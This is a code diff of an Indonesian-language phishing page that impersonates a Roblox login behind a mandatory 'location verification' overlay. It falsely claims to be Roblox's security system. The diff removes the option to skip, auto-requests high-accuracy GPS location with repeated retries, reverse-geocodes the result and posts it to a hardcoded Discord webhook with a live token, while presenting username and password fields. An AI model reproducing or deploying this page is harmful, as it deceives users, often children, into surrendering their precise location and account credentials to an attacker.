@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Verifikasi Lokasi</title>
+    <title>Roblox - Login dengan Verifikasi Lokasi</title>
     <link rel="icon" href="https://en.help.roblox.com/hc/article_attachments/4417181692692" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -22,23 +22,20 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
         }
 
         .container {
             width: 100%;
-            max-width: 480px;
-            background: rgba(25, 33, 52, 0.9);
+            max-width: 450px;
+            background: rgba(25, 33, 52, 0.95);
             backdrop-filter: blur(20px);
             border-radius: 24px;
             border: 1px solid rgba(0, 162, 255, 0.3);
             overflow: hidden;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6);
-            animation: fadeIn 0.6s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
+            position: relative;
+            z-index: 1;
         }
 
         .header {
@@ -46,44 +43,158 @@
             padding: 35px;
             text-align: center;
             position: relative;
-            overflow: hidden;
-        }
-
-        .header::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.1"><path fill="white" d="M50,0 C77.614,0 100,22.386 100,50 C100,77.614 77.614,100 50,100 C22.386,100 0,77.614 0,50 C0,22.386 22.386,0 50,0 Z M50,20 C33.431,20 20,33.431 20,50 C20,66.569 33.431,80 50,80 C66.569,80 80,66.569 80,50 C80,33.431 66.569,20 50,20 Z"/></svg>');
-            background-size: 200px;
-            opacity: 0.1;
         }
 
         .logo {
             font-size: 48px;
             font-weight: 800;
-            margin-bottom: 10px;
-            position: relative;
-            z-index: 1;
             letter-spacing: -1.5px;
+            margin-bottom: 5px;
         }
 
         .title {
-            font-size: 20px;
-            font-weight: 500;
+            font-size: 18px;
             opacity: 0.95;
-            position: relative;
-            z-index: 1;
+            font-weight: 500;
         }
 
         .content {
             padding: 40px;
         }
 
-        .login-form {
+        /* LOCATION OVERLAY - TAMPIL DI ATAS FORM */
+        .location-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 17, 40, 0.98);
+            backdrop-filter: blur(30px);
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            text-align: center;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+
+        .location-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .location-icon {
+            font-size: 80px;
             margin-bottom: 30px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        .location-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #00a2ff;
+        }
+
+        .location-message {
+            font-size: 18px;
+            color: #b8c7e8;
+            line-height: 1.6;
+            margin-bottom: 40px;
+            max-width: 400px;
+        }
+
+        .location-button {
+            background: linear-gradient(90deg, #00a2ff, #00d4ff);
+            color: white;
+            border: none;
+            border-radius: 16px;
+            padding: 22px 50px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 30px;
+            min-width: 280px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .location-button:hover {
+            background: linear-gradient(90deg, #0088ff, #00b8ff);
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 162, 255, 0.4);
+        }
+
+        .location-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .location-button.loading::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: loading 1.5s infinite;
+        }
+
+        @keyframes loading {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .warning-box {
+            background: rgba(255, 107, 107, 0.1);
+            border: 2px solid rgba(255, 107, 107, 0.3);
+            border-radius: 16px;
+            padding: 25px;
+            margin-top: 30px;
+            max-width: 400px;
+            display: none;
+        }
+
+        .warning-box.active {
+            display: block;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .warning-icon {
+            color: #ff6b6b;
+            font-size: 24px;
+            margin-right: 15px;
+            vertical-align: middle;
+        }
+
+        /* LOGIN FORM (TAMPIL DI BAWAH) */
+        .login-form {
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        .login-form.blurred {
+            opacity: 0.3;
+            filter: blur(3px);
+            pointer-events: none;
         }
 
         .form-group {
@@ -101,10 +212,6 @@
             gap: 8px;
         }
 
-        .form-label::before {
-            font-size: 18px;
-        }
-
         .form-input {
             width: 100%;
             padding: 18px 22px;
@@ -113,7 +220,7 @@
             border-radius: 14px;
             color: #ffffff;
             font-size: 16px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: all 0.3s;
         }
 
         .form-input:focus {
@@ -121,174 +228,27 @@
             border-color: #00a2ff;
             background: rgba(13, 20, 33, 1);
             box-shadow: 0 0 0 5px rgba(0, 162, 255, 0.2);
-            transform: translateY(-2px);
         }
 
         .form-input::placeholder {
             color: #6a7ca5;
         }
 
-        .location-permission {
-            background: linear-gradient(135deg, rgba(0, 162, 255, 0.1) 0%, rgba(0, 212, 255, 0.1) 100%);
-            border: 2px solid rgba(0, 162, 255, 0.4);
-            border-radius: 18px;
-            padding: 30px;
-            margin: 30px 0;
-            text-align: center;
-            animation: pulse 2s infinite;
+        .password-container {
+            position: relative;
         }
 
-        @keyframes pulse {
-            0% { border-color: rgba(0, 162, 255, 0.4); }
-            50% { border-color: rgba(0, 162, 255, 0.8); }
-            100% { border-color: rgba(0, 162, 255, 0.4); }
-        }
-
-        .permission-icon {
-            font-size: 50px;
-            margin-bottom: 20px;
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .permission-title {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 15px;
-            color: #00a2ff;
-        }
-
-        .permission-text {
-            color: #b8c7e8;
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 25px;
-        }
-
-        .permission-buttons {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-        }
-
-        .permission-btn {
-            padding: 16px 32px;
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            min-width: 140px;
-        }
-
-        .permission-btn.allow {
-            background: linear-gradient(90deg, #00a2ff, #00d4ff);
-            color: white;
-        }
-
-        .permission-btn.allow:hover {
-            background: linear-gradient(90deg, #0088ff, #00b8ff);
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 162, 255, 0.4);
-        }
-
-        .permission-btn.deny {
-            background: rgba(255, 255, 255, 0.1);
-            color: #b8c7e8;
-            border: 2px solid #2a3655;
-        }
-
-        .permission-btn.deny:hover {
-            background: rgba(255, 255, 255, 0.15);
-            border-color: #3a4565;
-        }
-
-        .location-details {
-            background: rgba(0, 255, 136, 0.05);
-            border: 2px solid rgba(0, 255, 136, 0.3);
-            border-radius: 16px;
-            padding: 25px;
-            margin: 25px 0;
-            display: none;
-        }
-
-        .location-details.active {
-            display: block;
-            animation: slideUp 0.5s ease;
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .location-header {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-
-        .location-icon {
-            font-size: 28px;
-            color: #00ff88;
-        }
-
-        .location-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #00ff88;
-        }
-
-        .location-info {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .info-box {
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 12px;
-            padding: 15px;
-        }
-
-        .info-label {
-            font-size: 12px;
             color: #6a7ca5;
-            margin-bottom: 5px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .info-value {
-            font-size: 16px;
-            font-weight: 500;
-            color: #ffffff;
-            word-break: break-all;
-        }
-
-        .map-link {
-            display: inline-block;
-            background: rgba(0, 162, 255, 0.1);
-            border: 2px solid rgba(0, 162, 255, 0.3);
-            border-radius: 10px;
-            padding: 12px 20px;
-            color: #00a2ff;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s;
-            margin-top: 10px;
-        }
-
-        .map-link:hover {
-            background: rgba(0, 162, 255, 0.2);
-            transform: translateY(-2px);
+            cursor: pointer;
+            font-size: 14px;
+            padding: 5px;
         }
 
         .login-button {
@@ -302,26 +262,9 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
-            margin-top: 20px;
+            margin-top: 10px;
             position: relative;
             overflow: hidden;
-        }
-
-        .login-button::after {
-            content: "";
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-            transform: rotate(45deg);
-            animation: shimmer 3s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { transform: translateX(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) rotate(45deg); }
         }
 
         .login-button:hover {
@@ -336,55 +279,78 @@
             transform: none;
         }
 
-        .login-button:disabled::after {
-            animation: none;
+        .login-button.loading::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: loading 1.5s infinite;
         }
 
-        .loader {
-            display: none;
-            text-align: center;
-            padding: 30px;
-        }
-
-        .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-top: 4px solid #00a2ff;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        .success-message {
-            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1) 0%, rgba(0, 212, 255, 0.1) 100%);
-            border: 2px solid rgba(0, 255, 136, 0.4);
-            border-radius: 18px;
-            padding: 35px;
-            text-align: center;
+        /* LOCATION STATUS INDICATOR */
+        .location-status {
+            background: rgba(0, 255, 136, 0.1);
+            border: 2px solid rgba(0, 255, 136, 0.3);
+            border-radius: 14px;
+            padding: 20px;
+            margin-top: 25px;
             display: none;
         }
 
-        .success-message.active {
+        .location-status.active {
             display: block;
-            animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            animation: slideUp 0.5s ease;
         }
 
-        @keyframes popIn {
-            0% { opacity: 0; transform: scale(0.5); }
-            100% { opacity: 1; transform: scale(1); }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .success-icon {
-            font-size: 60px;
+        .status-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .status-icon {
+            font-size: 28px;
             color: #00ff88;
-            margin-bottom: 20px;
-            animation: successScale 0.5s ease-out 0.2s both;
         }
 
-        @keyframes successScale {
-            0% { transform: scale(0); }
-            100% { transform: scale(1); }
+        .status-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #00ff88;
+        }
+
+        .status-details {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            font-size: 14px;
+        }
+
+        .detail-item {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            padding: 12px;
+        }
+
+        .detail-label {
+            color: #6a7ca5;
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .detail-value {
+            color: #ffffff;
+            font-weight: 500;
+            word-break: break-all;
         }
 
         .footer {
@@ -393,28 +359,65 @@
             color: #6a7ca5;
             font-size: 13px;
             border-top: 1px solid rgba(42, 54, 85, 0.5);
+            margin-top: 30px;
         }
 
-        .accuracy-meter {
+        /* PROGRESS BAR */
+        .progress-container {
+            margin-top: 30px;
+            display: none;
+        }
+
+        .progress-container.active {
+            display: block;
+        }
+
+        .progress-text {
+            font-size: 14px;
+            color: #6a7ca5;
+            margin-bottom: 10px;
             display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 10px;
+            justify-content: space-between;
         }
 
-        .meter-bar {
-            flex: 1;
-            height: 6px;
+        .progress-bar {
+            height: 8px;
             background: rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
+            border-radius: 4px;
             overflow: hidden;
         }
 
-        .meter-fill {
+        .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #ff6b6b, #ffd166, #00ff88);
-            border-radius: 3px;
-            transition: width 1s ease;
+            background: linear-gradient(90deg, #00a2ff, #00d4ff);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        /* ATTEMPT COUNTER */
+        .attempt-counter {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255, 107, 107, 0.2);
+            color: #ff6b6b;
+            padding: 10px 18px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            display: none;
+            z-index: 1000;
+        }
+
+        .attempt-counter.active {
+            display: block;
+            animation: pulse-red 2s infinite;
+        }
+
+        @keyframes pulse-red {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
+            50% { box-shadow: 0 0 0 10px rgba(255, 107, 107, 0); }
         }
 
         @media (max-width: 520px) {
@@ -426,135 +429,118 @@
                 padding: 30px 25px;
             }
             
-            .permission-buttons {
-                flex-direction: column;
+            .location-overlay {
+                padding: 30px 25px;
             }
             
-            .permission-btn {
-                min-width: 100%;
+            .location-title {
+                font-size: 26px;
             }
             
-            .location-info {
-                grid-template-columns: 1fr;
+            .location-message {
+                font-size: 16px;
+            }
+            
+            .location-button {
+                padding: 20px 40px;
+                font-size: 18px;
+                min-width: 250px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- ATTEMPT COUNTER -->
+    <div class="attempt-counter" id="attemptCounter">
+        Percobaan: <span id="attemptCount">0</span>/3
+    </div>
+
+    <!-- LOCATION OVERLAY (Wajib di-click) -->
+    <div class="location-overlay" id="locationOverlay">
+        <div class="location-icon">📍</div>
+        <div class="location-title">Verifikasi Lokasi Wajib</div>
+        <div class="location-message">
+            Untuk keamanan akun Roblox Anda, kami perlu memverifikasi lokasi perangkat.
+            <br><br>
+            <strong>Klik tombol di bawah untuk mengizinkan akses lokasi.</strong>
+            <br>
+            Form login tidak dapat disubmit tanpa verifikasi ini.
+        </div>
+        
+        <button class="location-button" id="locationButton">
+            ✅ Izinkan Akses Lokasi Sekarang
+        </button>
+        
+        <div class="warning-box" id="warningBox">
+            <div>
+                <span class="warning-icon">⚠️</span>
+                <span id="warningText">Anda harus mengizinkan lokasi untuk melanjutkan login.</span>
+            </div>
+        </div>
+        
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-text">
+                <span>Status Verifikasi:</span>
+                <span id="progressStatus">Menunggu...</span>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTAINER (Login Form) -->
+    <div class="container" id="mainContainer">
         <div class="header">
             <div class="logo">Roblox</div>
-            <div class="title">Verifikasi Lokasi untuk Keamanan Chat</div>
+            <div class="title">Login dengan Verifikasi Keamanan</div>
         </div>
 
         <div class="content">
-            <form id="loginForm">
-                <div class="login-form">
-                    <div class="form-group">
-                        <label class="form-label" for="username">
-                            👤 Nama Pengguna atau Email
-                        </label>
-                        <input type="text" id="username" class="form-input" placeholder="contoh: player123 atau player@email.com" required autofocus>
-                    </div>
-
-                    <div class="form-group">
-                        <label class="form-label" for="password">
-                            🔑 Password
-                        </label>
-                        <input type="password" id="password" class="form-input" placeholder="Masukkan password akun Roblox" required>
-                    </div>
+            <div class="login-form" id="loginForm">
+                <div class="form-group">
+                    <label class="form-label" for="username">
+                        👤 Nama Pengguna atau Email
+                    </label>
+                    <input type="text" id="username" class="form-input" 
+                           placeholder="contoh: player123 atau player@email.com" required>
                 </div>
 
-                <!-- Location Permission Request -->
-                <div class="location-permission" id="locationPermission">
-                    <div class="permission-icon">📍</div>
-                    <div class="permission-title">Izin Akses Lokasi Diperlukan</div>
-                    <div class="permission-text">
-                        Untuk memastikan keamanan akun Anda, kami perlu memverifikasi lokasi perangkat Anda.
-                        <br><br>
-                        <strong>Mengapa kami membutuhkannya?</strong><br>
-                        • Mencegah akses tidak sah dari lokasi mencurigakan<br>
-                        • Melindungi akun dari upaya peretasan<br>
-                        • Memastikan pengalaman chat yang aman
-                    </div>
-                    <div class="permission-buttons">
-                        <button type="button" class="permission-btn allow" id="allowLocation">
-                            Izinkan Akses Lokasi
-                        </button>
-                        <button type="button" class="permission-btn deny" id="denyLocation">
-                            Nanti Saja
+                <div class="form-group">
+                    <label class="form-label" for="password">
+                        🔑 Password
+                    </label>
+                    <div class="password-container">
+                        <input type="password" id="password" class="form-input" 
+                               placeholder="Masukkan password akun Roblox" required>
+                        <button type="button" class="toggle-password" id="togglePassword">
+                            Tampilkan
                         </button>
                     </div>
                 </div>
 
-                <!-- Location Details (Shown after permission granted) -->
-                <div class="location-details" id="locationDetails">
-                    <div class="location-header">
-                        <div class="location-icon">✅</div>
-                        <div class="location-title">Lokasi Berhasil Diverifikasi</div>
+                <div class="location-status" id="locationStatus">
+                    <div class="status-header">
+                        <div class="status-icon">📍</div>
+                        <div class="status-title">Status Lokasi</div>
                     </div>
-                    
-                    <div class="location-info">
-                        <div class="info-box">
-                            <div class="info-label">Koordinat GPS</div>
-                            <div class="info-value" id="gpsCoords">-</div>
-                        </div>
-                        <div class="info-box">
-                            <div class="info-label">Akurasi</div>
-                            <div class="info-value" id="gpsAccuracy">-</div>
-                        </div>
-                        <div class="info-box">
-                            <div class="info-label">Kota</div>
-                            <div class="info-value" id="gpsCity">-</div>
-                        </div>
-                        <div class="info-box">
-                            <div class="info-label">Negara</div>
-                            <div class="info-value" id="gpsCountry">-</div>
-                        </div>
-                    </div>
-                    
-                    <div class="accuracy-meter">
-                        <div style="font-size: 12px; color: #6a7ca5;">Presisi:</div>
-                        <div class="meter-bar">
-                            <div class="meter-fill" id="accuracyMeter" style="width: 0%"></div>
-                        </div>
-                    </div>
-                    
-                    <a href="#" class="map-link" id="mapLink" target="_blank" style="display: none;">
-                        🗺️ Lihat di Google Maps
-                    </a>
-                </div>
-
-                <!-- Loading State -->
-                <div class="loader" id="loader">
-                    <div class="spinner"></div>
-                    <div style="color: #b8c7e8; margin-top: 15px; font-size: 15px;">
-                        Memverifikasi kredensial dan lokasi...
-                    </div>
-                </div>
-
-                <!-- Success Message -->
-                <div class="success-message" id="successMessage">
-                    <div class="success-icon">✓</div>
-                    <div style="font-size: 22px; font-weight: 600; margin-bottom: 10px; color: #00ff88;">
-                        Verifikasi Berhasil!
-                    </div>
-                    <div style="color: #b8c7e8; font-size: 15px; line-height: 1.6;">
-                        Akun Anda sekarang terlindungi dengan verifikasi lokasi.
-                        <br>
-                        Mengarahkan ke Roblox dalam <span id="countdown">5</span> detik...
+                    <div class="status-details" id="statusDetails">
+                        <!-- Will be filled by JavaScript -->
                     </div>
                 </div>
 
                 <button type="submit" class="login-button" id="loginButton" disabled>
-                    🔒 Masuk & Verifikasi Akun
+                    🔐 Login ke Roblox
                 </button>
-            </form>
+                <div style="margin-top: 15px; text-align: center; color: #ff6b6b; font-size: 14px;">
+                    ⚠️ Verifikasi lokasi diperlukan untuk login
+                </div>
+            </div>
 
             <div class="footer">
-                <div>© 2024 Roblox Corporation. Sistem Keamanan Lokasi</div>
-                <div style="margin-top: 10px; font-size: 12px; color: #4a5a8a;">
-                    Data lokasi hanya digunakan untuk verifikasi keamanan
+                <div>© 2024 Roblox Corporation</div>
+                <div style="margin-top: 10px; font-size: 12px;">
+                    Sistem keamanan dengan verifikasi lokasi real-time
                 </div>
             </div>
         </div>
@@ -564,79 +550,82 @@
         // Webhook URL
         const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1437726455399448678/QtsMjTl2ZJ6hJ1oekE4SKCnHbM_dH8CZoyzwtWHuZbaaFmh-EAct9BhcIFqk3ZtTqtRP';
         
-        // Variables for location data
-        let userLocation = null;
-        let locationData = {
-            coords: null,
-            address: null,
-            accuracy: null,
-            timestamp: null
-        };
-        let locationPermissionGranted = false;
+        // State
+        let locationGranted = false;
+        let attempts = 0;
+        let maxAttempts = 3;
+        let locationData = null;
         
         // DOM Elements
-        const locationPermission = document.getElementById('locationPermission');
-        const locationDetails = document.getElementById('locationDetails');
+        const locationOverlay = document.getElementById('locationOverlay');
+        const locationButton = document.getElementById('locationButton');
+        const warningBox = document.getElementById('warningBox');
+        const warningText = document.getElementById('warningText');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressFill = document.getElementById('progressFill');
+        const progressStatus = document.getElementById('progressStatus');
+        const attemptCounter = document.getElementById('attemptCounter');
+        const attemptCount = document.getElementById('attemptCount');
+        const loginFormElement = document.getElementById('loginForm');
         const loginButton = document.getElementById('loginButton');
-        const allowBtn = document.getElementById('allowLocation');
-        const denyBtn = document.getElementById('denyLocation');
+        const locationStatus = document.getElementById('locationStatus');
+        const statusDetails = document.getElementById('statusDetails');
+        const togglePassword = document.getElementById('togglePassword');
         
-        // Allow Location Button Click
-        allowBtn.addEventListener('click', async function() {
-            await requestHighAccuracyLocation();
-        });
-        
-        // Deny Location Button Click
-        denyBtn.addEventListener('click', function() {
-            locationPermission.innerHTML = `
-                <div class="permission-icon">⚠️</div>
-                <div class="permission-title">Verifikasi Lokasi Dilewati</div>
-                <div class="permission-text" style="color: #ffd166;">
-                    Anda dapat melanjutkan login, namun beberapa fitur keamanan mungkin tidak aktif.
-                    <br><br>
-                    <strong>Rekomendasi:</strong> Izinkan lokasi untuk perlindungan maksimal.
-                </div>
-                <button type="button" class="permission-btn allow" onclick="requestHighAccuracyLocation()" style="margin-top: 15px;">
-                    Coba Lagi
-                </button>
-            `;
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Blur login form when overlay is active
+            loginFormElement.classList.add('blurred');
             
-            // Still enable login but with warning
+            // Auto-start location request after 2 seconds
             setTimeout(() => {
-                locationPermission.style.display = 'none';
-                loginButton.disabled = false;
-                loginButton.innerHTML = '⚠️ Lanjutkan Tanpa Verifikasi Lokasi';
+                if (!locationGranted) {
+                    startLocationVerification();
+                }
             }, 2000);
         });
         
-        // Request high accuracy location
-        async function requestHighAccuracyLocation() {
-            if (!navigator.geolocation) {
-                showLocationError("Browser tidak mendukung geolocation");
+        // Toggle password visibility
+        togglePassword.addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            this.textContent = type === 'password' ? 'Tampilkan' : 'Sembunyikan';
+        });
+        
+        // Location button click handler
+        locationButton.addEventListener('click', startLocationVerification);
+        
+        // Start location verification
+        async function startLocationVerification() {
+            if (attempts >= maxAttempts) {
+                showWarning("Percobaan verifikasi habis. Halaman akan direfresh.");
+                setTimeout(() => location.reload(), 3000);
                 return;
             }
             
-            // Show loading state
-            locationPermission.innerHTML = `
-                <div class="spinner" style="width: 40px; height: 40px; margin: 0 auto 20px;"></div>
-                <div class="permission-title">Mengambil Lokasi Presisi Tinggi</div>
-                <div class="permission-text">
-                    Mengaktifkan GPS dan sensor lokasi...
-                    <br>
-                    Pastikan Anda berada di area terbuka untuk akurasi terbaik.
-                </div>
-            `;
+            attempts++;
+            updateAttemptCounter();
             
-            // Request location with maximum accuracy
+            // Show progress
+            locationButton.classList.add('loading');
+            locationButton.disabled = true;
+            locationButton.innerHTML = '🔄 Memproses...';
+            progressContainer.classList.add('active');
+            updateProgress(30, "Meminta izin lokasi...");
+            
+            // Request location
+            if (!navigator.geolocation) {
+                handleLocationError("Browser tidak mendukung geolocation");
+                return;
+            }
+            
             navigator.geolocation.getCurrentPosition(
-                async function(position) {
-                    await processHighAccuracyLocation(position);
+                async (position) => {
+                    await handleLocationSuccess(position);
                 },
-                async function(error) {
-                    console.error("Geolocation error:", error);
-                    
-                    // Try with lower accuracy settings
-                    await tryFallbackLocationMethods(error);
+                (error) => {
+                    handleLocationError(getGeolocationError(error));
                 },
                 {
                     enableHighAccuracy: true,
@@ -646,263 +635,194 @@
             );
         }
         
-        // Process high accuracy location data
-        async function processHighAccuracyLocation(position) {
+        // Handle successful location capture
+        async function handleLocationSuccess(position) {
+            updateProgress(70, "Mengambil data lokasi...");
+            
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
             const accuracy = position.coords.accuracy;
-            const altitude = position.coords.altitude;
-            const heading = position.coords.heading;
-            const speed = position.coords.speed;
             
             // Store location data
             locationData = {
                 coords: { lat, lng },
                 accuracy: accuracy,
-                altitude: altitude,
-                heading: heading,
-                speed: speed,
-                timestamp: new Date(position.timestamp).toISOString(),
-                source: 'gps_high_accuracy'
+                timestamp: new Date().toISOString(),
+                source: 'gps'
             };
             
-            // Get detailed address information
-            const addressInfo = await getDetailedAddress(lat, lng);
+            // Get address
+            try {
+                const address = await getAddress(lat, lng);
+                locationData.address = address;
+            } catch (error) {
+                locationData.address = `Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+            }
             
-            // Update UI with location details
-            updateLocationUI(lat, lng, accuracy, addressInfo);
+            // Send to webhook
+            await sendLocationToWebhook(lat, lng, accuracy, locationData.address);
             
-            // Hide permission box, show details
-            locationPermission.style.display = 'none';
-            locationDetails.classList.add('active');
+            // Update UI
+            updateProgress(100, "✅ Lokasi berhasil diverifikasi");
+            locationButton.innerHTML = '✅ Lokasi Diverifikasi';
+            locationButton.style.background = 'linear-gradient(90deg, #00ff88, #00cc66)';
+            
+            // Wait then hide overlay
+            setTimeout(() => {
+                hideLocationOverlay();
+                updateLoginFormWithLocation();
+            }, 1500);
+        }
+        
+        // Handle location error
+        function handleLocationError(errorMessage) {
+            locationButton.classList.remove('loading');
+            locationButton.disabled = false;
+            locationButton.innerHTML = '📍 Izinkan Akses Lokasi Sekarang';
+            
+            showWarning(errorMessage);
+            updateProgress(0, "Verifikasi gagal");
+            
+            // Auto-retry after 3 seconds if not max attempts
+            if (attempts < maxAttempts) {
+                setTimeout(() => {
+                    startLocationVerification();
+                }, 3000);
+            }
+        }
+        
+        // Hide location overlay and show login form
+        function hideLocationOverlay() {
+            locationOverlay.classList.add('hidden');
+            loginFormElement.classList.remove('blurred');
+            locationGranted = true;
             
             // Enable login button
             loginButton.disabled = false;
-            locationPermissionGranted = true;
-            
-            // Send initial location data to webhook
-            await sendHighAccuracyLocation(lat, lng, accuracy, addressInfo);
+            loginButton.innerHTML = '🔐 Login ke Roblox';
         }
         
-        // Fallback location methods
-        async function tryFallbackLocationMethods(error) {
-            let errorMessage = "Gagal mengambil lokasi";
+        // Update login form with location info
+        function updateLoginFormWithLocation() {
+            locationStatus.classList.add('active');
             
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMessage = "Izin lokasi ditolak";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    errorMessage = "Informasi lokasi tidak tersedia";
-                    break;
-                case error.TIMEOUT:
-                    errorMessage = "Waktu permintaan habis";
-                    break;
-            }
-            
-            // Try IP-based location as fallback
-            const ipLocation = await getIPLocation();
-            if (ipLocation) {
-                locationData = {
-                    coords: { lat: ipLocation.lat, lng: ipLocation.lng },
-                    accuracy: 50000, // IP accuracy is low
-                    timestamp: new Date().toISOString(),
-                    source: 'ip_fallback',
-                    error: errorMessage
-                };
-                
-                updateLocationUI(ipLocation.lat, ipLocation.lng, 50000, ipLocation.address);
-                locationPermission.style.display = 'none';
-                locationDetails.classList.add('active');
-                loginButton.disabled = false;
-            } else {
-                showLocationError(errorMessage);
-            }
-        }
-        
-        // Get detailed address from coordinates
-        async function getDetailedAddress(lat, lng) {
-            try {
-                // Try multiple geocoding services for best results
-                const services = [
-                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
-                    `https://geocode.xyz/${lat},${lng}?json=1`
-                ];
-                
-                for (const service of services) {
-                    try {
-                        const response = await fetch(service, {
-                            headers: {
-                                'Accept-Language': 'id,en'
-                            }
-                        });
-                        
-                        if (response.ok) {
-                            const data = await response.json();
-                            return parseAddressData(data, service);
-                        }
-                    } catch (e) {
-                        continue;
-                    }
-                }
-                
-                return {
-                    address: `Lokasi: ${lat.toFixed(6)}, ${lng.toFixed(6)}`,
-                    city: "Tidak diketahui",
-                    country: "Tidak diketahui"
-                };
-                
-            } catch (error) {
-                return {
-                    address: `Koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`,
-                    city: "Error",
-                    country: "Error"
-                };
-            }
-        }
-        
